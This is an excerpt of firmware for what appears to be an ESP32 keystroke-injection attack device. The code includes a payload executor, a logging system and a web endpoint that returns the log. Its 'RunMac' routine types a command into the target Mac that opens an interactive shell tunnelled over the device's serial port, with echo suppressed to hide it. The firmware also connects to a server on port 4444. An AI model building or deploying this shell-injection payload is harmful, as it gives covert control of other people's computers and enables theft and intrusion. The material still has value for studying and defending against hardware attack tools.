...
String password = "CHANGE_ME_DEVICE_PASSWORD"; // Set a device-specific password before use
char *serverIP;
int serverPort = 4444;
...
const size_t MAX_PAYLOAD_LOG_BYTES = 65536;
...
void logPayloadEvent(const String &event, const String &detail = "") {
  if (LittleFS.exists("/payload_execution.log")) {
    File existingLog = LittleFS.open("/payload_execution.log", FILE_READ);
    if (existingLog) {
      size_t currentSize = existingLog.size();
      existingLog.close();
      if (currentSize >= MAX_PAYLOAD_LOG_BYTES) {
        return;
      }
    }
  }

  File logFile = LittleFS.open("/payload_execution.log", FILE_APPEND);
  if (!logFile) {
    return;
  }
  ...
  if (timeSynchronized && getLocalTime(&timeinfo, 100)) {
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &timeinfo);
    logFile.print(timestamp);
  } else {
    logFile.print("TIME_UNSYNCED");
  }
...
void clearPayloadLog() {
  if (LittleFS.exists("/payload_execution.log")) {
    LittleFS.remove("/payload_execution.log");
  }
}

String readPayloadLog() {
  String result = "";
  ...
  File logFile = LittleFS.open("/payload_execution.log", FILE_READ);
  if (!logFile) {
    return result;
  }
...
void payloadExec() {
  ...
  if (cmd.startsWith("RunMac ")) {
    ...
    Keyboard.releaseAll();
    delay(500);
    Keyboard.println("stty -echo; sh -i > /dev/serial/by-id/*" + deviceName + "* 2>&1 < /dev/serial/by-id/*" + deviceName + "*; stty echo");
  }
    ...
    logPayloadEvent("SERVER_CONNECT_RESULT",
                    connected ? "connect=true" : "connect=false");
    logPayloadEvent("SERVER_CONNECT_STATE",
                    clientServer.connected() ? "connected=true" : "connected=false");

    if (connected && clientServer.connected()) {
        clientServer.print("PUBLIC-DEMO-MARKER\\n");
        logPayloadEvent("SERVER_TEST_MARKER_SENT",
                        "PUBLIC-DEMO-MARKER");
    }
  }
...
void setup() {
  ...
  controlserver.on("/payloadlog", []() {
    controlserver.send(200, "text/plain", readPayloadLog());
  });
...
void loop() {
  ...
  if (payload_state == 1) {
    ...
    while (splitlines != NULL) {
      ...
      if (cmd.length() > 0 && !cmd.startsWith("##") && !cmd.startsWith("REM")) {
        commandCount++;
        logPayloadEvent("COMMAND_START", cmd);
      }

      payloadExec();

      if (cmd.length() > 0 && !cmd.startsWith("##") && !cmd.startsWith("REM")) {
        logPayloadEvent("COMMAND_COMPLETE", cmd);
      }
    ...
    logPayloadEvent("PAYLOAD_COMPLETE", String("commands=") + commandCount);
